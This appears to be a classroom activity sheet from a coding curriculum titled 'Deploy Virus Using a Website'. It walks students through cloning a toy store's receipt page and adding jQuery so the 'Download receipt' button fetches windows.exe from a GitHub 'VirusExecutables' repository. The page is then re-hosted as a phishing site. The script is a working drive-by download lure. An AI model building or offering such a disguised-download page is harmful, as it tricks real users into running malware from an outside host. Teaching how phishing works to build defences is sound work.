Deploy Virus Using a Website
======================
In this activity, you will deploy a virus using a fishing website.


<img src= "https://s3-whjr-curriculum-uploads.whjr.online/e8d01e01-d0d6-4ebe-8d57-d943b6cea187.gif" width = "100%" height = "50%">




Follow the given steps to complete this activity.




1. Open the toy [E-commerce](https://tnk-m16-toywebsite.onrender.com/) website and place an order for a toy.
   
2. Save the profile.html page with `Download receipt` button on your system.
3. Open the downloaded file and add the jquery script to download the executable virus from `https://github.com/Tynker-Computer-Networks/TNK-M16-VirusExecutables/raw/main/windows.exe` on button click.
   * Open `profile.html` and add code to download the virus.
   ```
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script>
            $(".receipt-button").click(function(){
                window.location.href = "https://github.com/Tynker-Computer-Networks/TNK-M16-VirusExecutables/raw/main/windows.exe";
            })
    </script>
   ```
4. Host the profile.html file back on the github repository and generate the link.


Check if the hosted fishing website can download the virus or not.




